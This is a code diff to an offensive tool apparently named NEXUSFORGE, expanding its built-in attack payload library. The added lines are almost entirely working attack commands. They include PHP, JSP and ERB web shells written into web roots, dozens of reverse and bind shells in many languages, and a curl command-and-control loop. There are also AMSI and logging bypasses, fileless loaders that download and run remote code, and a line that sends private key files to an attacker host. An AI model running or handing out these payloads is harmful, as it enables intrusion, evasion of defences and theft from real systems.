@@ -288,13 +288,20 @@ const PAYLOAD_LIBRARY = [
     "find / -name '*.key' 2>/dev/null | xargs cat | base64 | curl -sk -X POST http://ATTACKER_IP:ATTACKER_PORT/ -d @-",
   ]},
   { cat:"WEB SHELLS",  col:"text-green-400", p:[
-    "echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/shell.php",
-    "echo '<?php @eval($_POST[\"c\"]); ?>' > /var/www/html/cmd.php",
-    "echo '<?php passthru($_GET[\"cmd\"]); ?>' > /tmp/shell.php",
-    "python3 -m http.server ATTACKER_PORT &",
-    "php -S 0.0.0.0:ATTACKER_PORT &",
-    "ruby -run -e httpd /tmp -p ATTACKER_PORT &",
-    "busybox httpd -f -p ATTACKER_PORT &",
+    `echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php`,
+    `echo '<?php @eval($_POST["c"]); ?>' > /var/www/html/cmd.php`,
+    `echo '<?php passthru($_GET["cmd"]); ?>' > /tmp/shell.php`,
+    `echo '<?php $c=$_GET["cmd"];$o=array();exec($c,$o);echo implode("\\n",$o); ?>' > /var/www/html/exec.php`,
+    `echo '<?php $d=base64_decode($_POST["d"]);eval($d); ?>' > /var/www/html/e.php`,
+    `echo '<?php if(isset($_REQUEST["cmd"])){echo "<pre>";$cmd=($_REQUEST["cmd"]);system($cmd);echo "</pre>";die;} ?>' > /var/www/html/c.php`,
+    `echo '<?php move_uploaded_file($_FILES["f"]["tmp_name"],"/var/www/html/u.php"); ?>' > /var/www/html/up.php`,
+    `printf '<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(request.getParameter("c"));BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null)out.println(l); %>' > /tmp/cmd.jsp`,
+    `echo '<%=\`#{params[:c]}\`%>' > /var/www/html/shell.erb`,
+    `python3 -m http.server ATTACKER_PORT &`,
+    `php -S 0.0.0.0:ATTACKER_PORT &`,
+    `ruby -run -e httpd /tmp -p ATTACKER_PORT &`,
+    `busybox httpd -f -p ATTACKER_PORT &`,
+    `node -e "require('http').createServer((q,r)=>{require('child_process').exec(require('url').parse(q.url,true).query.c||'id',(e,o)=>r.end(o))}).listen(ATTACKER_PORT)" &`,
   ]},
 ];
 
@@ -302,51 +309,126 @@ const PAYLOAD_LIBRARY = [
 function buildShells(ip: string, port: string) {
   const i = ip || "ATTACKER_IP";
   const p = port || "4444";
+  const pn = Number(p) || 4444;
   return [
-    { cat:"Bash",   name:"Bash TCP",      cmd:`bash -i >& /dev/tcp/${i}/${p} 0>&1` },
-    { cat:"Bash",   name:"Bash UDP",      cmd:`bash -i >& /dev/udp/${i}/${p} 0>&1` },
-    { cat:"Bash",   name:"Bash Exec",     cmd:`bash -c 'exec bash -i &>/dev/tcp/${i}/${p} <&1'` },
-    { cat:"NC",     name:"NC mkfifo",     cmd:`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${p} >/tmp/f` },
-    { cat:"NC",     name:"NC -e",         cmd:`nc -e /bin/sh ${i} ${p}` },
-    { cat:"NC",     name:"BusyBox NC",    cmd:`busybox nc ${i} ${p} -e sh` },
-    { cat:"NC",     name:"NC OpenBSD",    cmd:`rm /tmp/f;mkfifo /tmp/f;nc ${i} ${p} </tmp/f|/bin/bash >/tmp/f 2>&1` },
-    { cat:"Python", name:"Python3",       cmd:`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
-    { cat:"Python", name:"Python3 PTY",   cmd:`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${i}",${p}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'` },
-    { cat:"Python", name:"Python2",       cmd:`python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
-    { cat:"Perl",   name:"Perl",          cmd:`perl -e 'use Socket;$i="${i}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'` },
-    { cat:"Ruby",   name:"Ruby",          cmd:`ruby -rsocket -e 'f=TCPSocket.open("${i}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
-    { cat:"PHP",    name:"PHP",           cmd:`php -r '$s=fsockopen("${i}",${p});$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'` },
-    { cat:"Node",   name:"Node.js",       cmd:`node -e "(function(){var n=require('net'),s=new n.Socket();s.connect(${p},'${i}',function(){var sh=require('child_process').spawn('/bin/sh',[]);s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s)});})()"` },
-    { cat:"Go",     name:"Go",            cmd:`echo 'package main;import(n"net"s"os/exec");func main(){c,_:=n.Dial("tcp","${i}:${p}");cmd:=s.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/sh.go && go run /tmp/sh.go` },
-    { cat:"Socat",  name:"Socat PTY",     cmd:`socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:${i}:${p}` },
-    { cat:"Socat",  name:"Socat UDP",     cmd:`socat udp:${i}:${p} exec:/bin/sh` },
-    { cat:"AWK",    name:"AWK",           cmd:`awk 'BEGIN{s="/inet/tcp/0/${i}/${p}";for(;;){if((s|&getline c)<=0)break;while((c|getline)>0)print|&s;close(c)}}'` },
-    { cat:"SSL",    name:"OpenSSL",       cmd:`openssl s_client -quiet -connect ${i}:${p}|/bin/bash 2>&1|openssl s_client -quiet -connect ${i}:$((${p}+1))` },
-    { cat:"PS",     name:"PowerShell",    cmd:`powershell -NoP -NonI -W Hidden -Exec Bypass -Command $c=New-Object Net.Sockets.TCPClient("${i}",${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($r),0,$r.Length)};$c.Close()` },
-    { cat:"Lua",    name:"Lua",           cmd:`lua -e "require('socket');local s=require('socket').tcp();s:connect('${i}',${p});while true do local c=s:receive();local f=io.popen(c,'r');local r=f:read('*a');f:close();s:send(r) end"` },
-    { cat:"R",      name:"R",             cmd:`Rscript -e "s<-socketConnection('${i}',port=${p},blocking=TRUE,server=FALSE,open='r+');while(TRUE){cmd<-readLines(s,1);system(cmd)}"` },
-    { cat:"SSL",    name:"OpenSSL-SSL",     cmd:`openssl s_client -quiet -connect ${i}:${p}|/bin/bash 2>&1|openssl s_client -quiet -connect ${i}:${String(Number(p)+1)}` },
-    { cat:"SSL",    name:"Socat SSL",      cmd:`socat openssl:${i}:${p},verify=0 exec:/bin/bash,pty,stderr,setsid,sigint,sane` },
-    { cat:"Telnet", name:"Telnet mkfifo",  cmd:`TF=\$(mktemp -u);mkfifo \$TF && telnet ${i} ${p} 0<\$TF | /bin/sh 1>\$TF` },
-    { cat:"Bash",   name:"Bash fd 196",    cmd:`exec 196<>/dev/tcp/${i}/${p}; sh <&196 >&196 2>&196` },
-    { cat:"Bash",   name:"Bash 3-fd",      cmd:`sh -i 3<>/dev/tcp/${i}/${p} <&3 >&3 2>&3` },
-    { cat:"Python", name:"Py3 SSL",        cmd:`python3 -c "import socket,ssl,subprocess,os;s=ssl.wrap_socket(socket.socket());s.connect(('${i}',${p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(['/bin/sh','-i'])" 2>/dev/null` },
-    { cat:"Curl",   name:"Curl C2 loop",   cmd:`while true; do C=\$(curl -sk http://${i}:${p}/c 2>/dev/null); [ -n "\$C" ] && eval "\$C" | curl -sk -X POST http://${i}:${p}/r -d @-; sleep 3; done &` },
-    { cat:"Go",     name:"Go compile",     cmd:`printf 'package main\nimport("net""os/exec")\nfunc main(){c,_:=net.Dial("tcp","${i}:${p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/s.go && go run /tmp/s.go 2>/dev/null &` },
-    { cat:"PHP",    name:"PHP proc_open",  cmd:`php -r "\$s=fsockopen('${i}',${p});\$p=proc_open('/bin/sh',array(0=>\$s,1=>\$s,2=>\$s),\$pipes);"` },
-    { cat:"Java",   name:"Java JDWP",      cmd:`java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:${p}` },
+    // ── Bash ──────────────────────────────────────────────
+    { cat:"Bash",   name:"Bash TCP",        cmd:`bash -i >& /dev/tcp/${i}/${p} 0>&1` },
+    { cat:"Bash",   name:"Bash UDP",        cmd:`bash -i >& /dev/udp/${i}/${p} 0>&1` },
+    { cat:"Bash",   name:"Bash Exec",       cmd:`bash -c 'exec bash -i &>/dev/tcp/${i}/${p} <&1'` },
+    { cat:"Bash",   name:"Bash fd 196",     cmd:`exec 196<>/dev/tcp/${i}/${p}; sh <&196 >&196 2>&196` },
+    { cat:"Bash",   name:"Bash 3-fd",       cmd:`sh -i 3<>/dev/tcp/${i}/${p} <&3 >&3 2>&3` },
+    { cat:"Bash",   name:"Bash /dev/tcp bg",cmd:`(bash -i >& /dev/tcp/${i}/${p} 0>&1) & disown` },
+    // ── NC ────────────────────────────────────────────────
+    { cat:"NC",     name:"NC mkfifo",       cmd:`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${p} >/tmp/f` },
+    { cat:"NC",     name:"NC -e",           cmd:`nc -e /bin/sh ${i} ${p}` },
+    { cat:"NC",     name:"BusyBox NC",      cmd:`busybox nc ${i} ${p} -e sh` },
+    { cat:"NC",     name:"NC OpenBSD",      cmd:`rm /tmp/f;mkfifo /tmp/f;nc ${i} ${p} </tmp/f|/bin/bash >/tmp/f 2>&1` },
+    { cat:"NC",     name:"NC named pipe",   cmd:`mknod /tmp/bp p && nc ${i} ${p} 0</tmp/bp | /bin/bash 1>/tmp/bp` },
+    // ── Python ────────────────────────────────────────────
+    { cat:"Python", name:"Python3",         cmd:`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
+    { cat:"Python", name:"Python3 PTY",     cmd:`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${i}",${p}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'` },
+    { cat:"Python", name:"Python2",         cmd:`python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
+    { cat:"Python", name:"Py3 SSL",         cmd:`python3 -c "import socket,ssl,subprocess,os;s=ssl.wrap_socket(socket.socket());s.connect(('${i}',${p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(['/bin/sh','-i'])" 2>/dev/null` },
+    { cat:"Python", name:"Py3 thread",      cmd:`python3 -c "import socket,threading,subprocess;s=socket.socket();s.connect(('${i}',${p}));c=subprocess.Popen(['/bin/sh'],stdin=s,stdout=s,stderr=s);c.wait()"` },
+    // ── Perl ──────────────────────────────────────────────
+    { cat:"Perl",   name:"Perl",            cmd:`perl -e 'use Socket;$i="${i}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'` },
+    { cat:"Perl",   name:"Perl oneliner",   cmd:`perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${i}:${p}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>'` },
+    // ── Ruby ──────────────────────────────────────────────
+    { cat:"Ruby",   name:"Ruby",            cmd:`ruby -rsocket -e 'f=TCPSocket.open("${i}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
+    { cat:"Ruby",   name:"Ruby popen",      cmd:`ruby -rsocket -e 'c=TCPSocket.new("${i}","${p}");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec"/bin/sh -i"'` },
+    // ── PHP ───────────────────────────────────────────────
+    { cat:"PHP",    name:"PHP fsockopen",   cmd:`php -r '$s=fsockopen("${i}",${p});$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'` },
+    { cat:"PHP",    name:"PHP proc_open",   cmd:`php -r "\$s=fsockopen('${i}',${p});\$p=proc_open('/bin/sh',array(0=>\$s,1=>\$s,2=>\$s),\$pipes);"` },
+    { cat:"PHP",    name:"PHP shell_exec",  cmd:`php -r "$sock=fsockopen('${i}',${p});exec('/bin/sh -i <&3 >&3 2>&3');" 3<>/dev/tcp/${i}/${p}` },
+    // ── Node.js ───────────────────────────────────────────
+    { cat:"Node",   name:"Node.js",         cmd:`node -e "(function(){var n=require('net'),s=new n.Socket();s.connect(${p},'${i}',function(){var sh=require('child_process').spawn('/bin/sh',[]);s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s)});})()"` },
+    { cat:"Node",   name:"Curl C2 loop",    cmd:`while true; do C=\$(curl -sk http://${i}:${p}/c 2>/dev/null); [ -n "\$C" ] && eval "\$C" | curl -sk -X POST http://${i}:${p}/r -d @-; sleep 3; done &` },
+    // ── Go ────────────────────────────────────────────────
+    { cat:"Go",     name:"Go compile",      cmd:`printf 'package main\nimport("net""os/exec")\nfunc main(){c,_:=net.Dial("tcp","${i}:${p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/s.go && go run /tmp/s.go 2>/dev/null &` },
+    // ── Socat ─────────────────────────────────────────────
+    { cat:"Socat",  name:"Socat PTY",       cmd:`socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:${i}:${p}` },
+    { cat:"Socat",  name:"Socat UDP",       cmd:`socat udp:${i}:${p} exec:/bin/sh` },
+    { cat:"Socat",  name:"Socat SSL",       cmd:`socat openssl:${i}:${p},verify=0 exec:/bin/bash,pty,stderr,setsid,sigint,sane` },
+    // ── SSL / OpenSSL ─────────────────────────────────────
+    { cat:"SSL",    name:"OpenSSL stdin",   cmd:`openssl s_client -quiet -connect ${i}:${p}|/bin/bash 2>&1|openssl s_client -quiet -connect ${i}:${pn+1}` },
+    { cat:"SSL",    name:"OpenSSL dual",    cmd:`openssl s_client -quiet -connect ${i}:${p}>/tmp/f & openssl s_client -quiet -connect ${i}:${pn+1}</tmp/f|bash>/tmp/f 2>&1` },
+    // ── Telnet ────────────────────────────────────────────
+    { cat:"Telnet", name:"Telnet mkfifo",   cmd:`TF=\$(mktemp -u);mkfifo \$TF && telnet ${i} ${p} 0<\$TF | /bin/sh 1>\$TF` },
+    { cat:"Telnet", name:"Telnet dual",     cmd:`telnet ${i} ${p} | /bin/bash | telnet ${i} ${pn+1}` },
+    // ── AWK ───────────────────────────────────────────────
+    { cat:"AWK",    name:"AWK",             cmd:`awk 'BEGIN{s="/inet/tcp/0/${i}/${p}";for(;;){if((s|&getline c)<=0)break;while((c|getline)>0)print|&s;close(c)}}'` },
+    // ── PowerShell ────────────────────────────────────────
+    { cat:"PS",     name:"PS TCPClient",    cmd:`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient('${i}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($r),0,$r.Length)};$c.Close()"` },
+    { cat:"PS",     name:"PS WebClient",    cmd:`powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://${i}:${p}/r.ps1')"` },
+    { cat:"PS",     name:"PS b64 payload",  cmd:`powershell -nop -ep bypass -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0AA==` },
+    // ── Lua ───────────────────────────────────────────────
+    { cat:"Lua",    name:"Lua socket",      cmd:`lua -e "require('socket');local s=require('socket').tcp();s:connect('${i}',${p});while true do local c=s:receive();local f=io.popen(c,'r');local r=f:read('*a');f:close();s:send(r) end"` },
+    // ── R ─────────────────────────────────────────────────
+    { cat:"R",      name:"R",               cmd:`Rscript -e "s<-socketConnection('${i}',port=${p},blocking=TRUE,server=FALSE,open='r+');while(TRUE){cmd<-readLines(s,1);system(cmd)}"` },
+    // ── Java ──────────────────────────────────────────────
+    { cat:"Java",   name:"Java Runtime",    cmd:`java -cp . -e 'Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/${i}/${p} 0>&1"})' 2>/dev/null` },
+    { cat:"Java",   name:"Java JDWP",       cmd:`java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:${p}` },
+
+    // ── BIND SHELLS ───────────────────────────────────────
+    { cat:"BIND",   name:"NC bind -e",      cmd:`nc -lvnp ${p} -e /bin/bash` },
+    { cat:"BIND",   name:"NC mkfifo bind",  cmd:`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp ${p} >/tmp/f` },
+    { cat:"BIND",   name:"Python3 bind",    cmd:`python3 -c 'import socket,subprocess;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",${p}));s.listen(1);c,a=s.accept();import os;[os.dup2(c.fileno(),j) for j in range(3)];subprocess.call(["/bin/sh","-i"])'` },
+    { cat:"BIND",   name:"Perl bind",       cmd:`perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(${p},INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i")'` },
+    { cat:"BIND",   name:"Socat bind PTY",  cmd:`socat tcp-listen:${p},reuseaddr,fork exec:/bin/bash,pty,stderr,setsid,sigint,sane` },
+    { cat:"BIND",   name:"PowerShell bind", cmd:`powershell -nop -ep bypass -c "$l=New-Object Net.Sockets.TcpListener('0.0.0.0',${p});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($r),0,$r.Length)}"` },
+
+    // ── TTY UPGRADE ───────────────────────────────────────
+    { cat:"TTY",    name:"Python3 PTY",     cmd:`python3 -c 'import pty;pty.spawn("/bin/bash")'` },
+    { cat:"TTY",    name:"Python2 PTY",     cmd:`python -c 'import pty;pty.spawn("/bin/bash")'` },
+    { cat:"TTY",    name:"Script /dev/null",cmd:`script /dev/null -c bash` },
+    { cat:"TTY",    name:"Stty raw (ctrl+z)",cmd:`# Press Ctrl+Z, then run: stty raw -echo; fg` },
+    { cat:"TTY",    name:"Stty fix term",   cmd:`export TERM=xterm; export SHELL=bash; stty rows 40 cols 200` },
+    { cat:"TTY",    name:"Socat PTY victim",cmd:`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${i}:${p}` },
+    { cat:"TTY",    name:"rlwrap listener", cmd:`rlwrap nc -lvnp ${p}` },
+    { cat:"TTY",    name:"Script PTY",      cmd:`script -q /dev/null /bin/bash` },
+
+    // ── AMSI BYPASS (Windows PowerShell) ──────────────────
+    { cat:"AMSI",   name:"Reflection amsiInitFailed",   cmd:`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` },
+    { cat:"AMSI",   name:"String-split obfuscation",    cmd:`$a='Am'+'siU'+'tils';$b=[Ref].Assembly.GetType('System.Management.Automation.'+$a);$b.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true)` },
+    { cat:"AMSI",   name:"VirtualProtect patch",        cmd:`Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxPatch{[DllImport("k"+"ernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("k"+"ernel32")]public static extern IntPtr LoadLibrary(string l);[DllImport("k"+"ernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);public static void Go(){uint o;IntPtr h=LoadLibrary("ams"+"i.dll");IntPtr f=GetProcAddress(h,"Amsi"+"ScanBuffer");VirtualProtect(f,(UIntPtr)5,0x40,out o);System.Runtime.InteropServices.Marshal.Copy(new byte[]{0x31,0xC0,0xC3,0x90,0x90},0,f,5);}}'; [NxPatch]::Go()` },
+    { cat:"AMSI",   name:"PS v2 downgrade",             cmd:`powershell.exe -Version 2 -NoProfile -ExecutionPolicy Bypass -Command` },
+    { cat:"AMSI",   name:"WMI exec bypass",             cmd:`([wmiclass]'win32_process').Create("powershell -nop -ep bypass -e {B64CMD}")` },
+    { cat:"AMSI",   name:"EnvVar bypass",               cmd:`$env:PSExecutionPolicyPreference='bypass';$e=[System.Text.Encoding]::Unicode;$d=[System.Convert]::FromBase64String` },
+    { cat:"AMSI",   name:"COM MsHtml bypass",           cmd:`$c=New-Object -COM 'MsHtml.HtmlDocument';$c.GetType().InvokeMember('scripts','GetProperty',$null,$c,$null)` },
+    { cat:"AMSI",   name:"ScriptBlock log disable",     cmd:`[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp');$t=[System.Management.Automation.PSParser].Assembly.GetType('System.Management.Automation.Security.SystemPolicy');$f=$t.GetField('cachedSystemLockdownPolicy','NonPublic,Static');if($f){$f.SetValue($null,-1)}` },
+    { cat:"AMSI",   name:"AMSI provider unregister",    cmd:`Remove-Item 'HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse -Force` },
+    { cat:"AMSI",   name:"CLM bypass via reflection",   cmd:`$t=[System.Management.Automation.PSParser].Assembly.GetType('System.Management.Automation.Utils');$f=$t.GetField('isSandboxed','NonPublic,Static');if($f){$f.SetValue($null,$false)}` },
+
+    // ── MEMFD / FILELESS (Linux in-memory) ────────────────
+    { cat:"MEMFD",  name:"Python3 memfd_create",  cmd:`python3 -c "import ctypes,os,socket;fd=ctypes.CDLL(None).memfd_create('',1);s=socket.socket();s.connect(('${i}',${p}));d=b'';[d:=d+t for t in iter(lambda:s.recv(65536),b'')];os.write(fd,d);os.execv('/proc/self/fd/'+str(fd),['x'])" 2>/dev/null` },
+    { cat:"MEMFD",  name:"Perl syscall 319",       cmd:`perl -e 'use POSIX;$fd=syscall(319,"x",1);open my$f,">&=",$fd;print$f \`curl -sk http://${i}:${p}/x\`;exec{"/proc/self/fd/$fd"}("x")' 2>/dev/null` },
+    { cat:"MEMFD",  name:"/dev/shm tmpfs exec",    cmd:`T=$(mktemp -p /dev/shm 2>/dev/null||mktemp -p /run/shm 2>/dev/null||mktemp);curl -sk http://${i}:${p}/x>$T;chmod +x $T;$T;rm -f $T 2>/dev/null` },
+    { cat:"MEMFD",  name:"Python3 in-process rev", cmd:`python3 -c "import socket,os;s=socket.socket();s.connect(('${i}',${p}));[os.dup2(s.fileno(),j) for j in range(3)];__import__('subprocess').call(['/bin/sh','-i'])" 2>/dev/null` },
+    { cat:"MEMFD",  name:"LD_PRELOAD /dev/shm",    cmd:`curl -sk http://${i}:${p}/l.so -o /dev/shm/.l.so 2>/dev/null && LD_PRELOAD=/dev/shm/.l.so /bin/ls 2>/dev/null; rm -f /dev/shm/.l.so` },
+    { cat:"MEMFD",  name:"Bash /proc/self/fd",     cmd:`exec 9<>/dev/tcp/${i}/${p} 2>/dev/null;cat <&9>/dev/shm/.x 2>/dev/null;chmod +x /dev/shm/.x;/dev/shm/.x;rm /dev/shm/.x 2>/dev/null` },
+    { cat:"MEMFD",  name:"Node in-memory eval",    cmd:`node -e "const h=require('http');h.get('http://${i}:${p}/p.js',r=>{let b='';r.on('data',d=>b+=d);r.on('end',()=>eval(b))})" 2>/dev/null` },
+    { cat:"MEMFD",  name:"dd via /proc/self/mem",  cmd:`dd if=/proc/self/mem bs=1 skip=$(($(cut -d- -f1 /proc/self/maps|head -1|tr -d '\\n'|xargs printf '%d\\n'))) count=64 2>/dev/null|xxd|head` },
+    { cat:"MEMFD",  name:"Shm anonymous pipe",     cmd:`python3 -c "import os,ctypes;l=ctypes.CDLL(None);fd=l.memfd_create(b'',1);os.write(fd,open('/bin/sh','rb').read());os.fexecve(fd,[b'sh'],[b'TERM=xterm',b'HOME=/tmp'])"` },
   ];
 }
 
 function buildListeners(port: string) {
   const p = port || "4444";
+  const pn = Number(p) || 4444;
   return [
-    { name:"NetCat",       cmd:`nc -lvnp ${p}` },
-    { name:"NetCat UDP",   cmd:`nc -lvnup ${p}` },
-    { name:"Socat TTY",    cmd:`socat file:\`tty\`,raw,echo=0 tcp-listen:${p}` },
-    { name:"OpenSSL",      cmd:`openssl req -x509 -newkey rsa:2048 -keyout /tmp/k.pem -out /tmp/c.pem -days 1 -nodes -subj '/CN=x' && openssl s_server -quiet -key /tmp/k.pem -cert /tmp/c.pem -port ${p}` },
-    { name:"Metasploit",   cmd:`msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${p}; run"` },
-    { name:"Python HTTP",  cmd:`python3 -m http.server ${p}` },
+    { name:"NC TCP",         cmd:`nc -lvnp ${p}` },
+    { name:"NC UDP",         cmd:`nc -lvnup ${p}` },
+    { name:"rlwrap NC",      cmd:`rlwrap nc -lvnp ${p}` },
+    { name:"Socat TTY",      cmd:`socat file:\`tty\`,raw,echo=0 tcp-listen:${p}` },
+    { name:"Socat UDP",      cmd:`socat udp-listen:${p},reuseaddr -` },
+    { name:"OpenSSL TLS",    cmd:`openssl req -x509 -newkey rsa:4096 -keyout /tmp/k.pem -out /tmp/c.pem -days 1 -nodes -subj '/CN=nx' 2>/dev/null && openssl s_server -quiet -key /tmp/k.pem -cert /tmp/c.pem -port ${p}` },
+    { name:"Metasploit LX",  cmd:`msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${p}; run"` },
+    { name:"Metasploit WIN", cmd:`msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${p}; run"` },
+    { name:"Metasploit PS",  cmd:`msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/powershell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${p}; run"` },
+    { name:"Python HTTP",    cmd:`python3 -m http.server ${p}` },
+    { name:"Python HTTPS",   cmd:`python3 -c "import ssl,http.server;s=http.server.HTTPServer(('',${p}),http.server.SimpleHTTPRequestHandler);s.socket=ssl.wrap_socket(s.socket,server_side=True,certfile='/tmp/c.pem',keyfile='/tmp/k.pem');s.serve_forever()"` },
+    { name:"Dual-port NC",   cmd:`nc -lvnp ${p} & nc -lvnp ${pn+1}` },
+    { name:"Impacket SMB",   cmd:`python3 -m impacket.smbserver -smb2support share $(pwd)` },
   ];
 }
 
@@ -461,7 +543,7 @@ export default function MainLab() {
   const [target,   setTarget]   = useState("");
   const [attIp,    setAttIp]    = useState("");
   const [attPort,  setAttPort]  = useState("4444");
-  const [output,   setOutput]   = useState("NEXUSFORGE v9.0 — 33 Modes · 9 Engines · WS Chain · Scanner · Remote Injection · Env Probe\n");
+  const [output,   setOutput]   = useState("NEXUSFORGE v9.0 — 34 Modes · 9 Engines · WS Chain · Scanner · Remote Injection · AMSI/Memfd Shells\n");
   // Remote injection state
   const [injectionUrl,   setInjectionUrl]   = useState("");
   const [injectParam,    setInjectParam]    = useState("cmd");
@@ -472,14 +554,15 @@ export default function MainLab() {
   const [running,  setRunning]  = useState(false);
   const [score,    setScore]    = useState(0);
   const [chain,    setChain]    = useState<string[]>([]);
-  const [stats,    setStats]    = useState({total:0,timing:0,windows_timing:0,stealth:0,classic:0,blind:0,oob:0,quantum:0,ifs:0,concat:0,hex:0,b64loop:0,env:0,heredoc:0,unicode:0,"null":0,wildcard:0,comment:0,double_enc:0,ssti:0,log4shell:0,xxe:0,polyglot:0,brace:0,process_sub:0,arith:0,ansi_c:0,rev:0,rev_shell:0,windows_rev:0,cloud:0,container:0,windows:0,antiforensics:0});
+  const [stats,    setStats]    = useState({total:0,timing:0,windows_timing:0,stealth:0,classic:0,blind:0,oob:0,quantum:0,polymorphic:0,ifs:0,concat:0,hex:0,b64loop:0,env:0,heredoc:0,unicode:0,"null":0,wildcard:0,comment:0,double_enc:0,ssti:0,log4shell:0,xxe:0,polyglot:0,brace:0,process_sub:0,arith:0,ansi_c:0,rev:0,rev_shell:0,windows_rev:0,cloud:0,container:0,windows:0,antiforensics:0});
   const [copyId,   setCopyId]   = useState<string|null>(null);
   const [history,  setHistory]  = useState<string[]>([]);
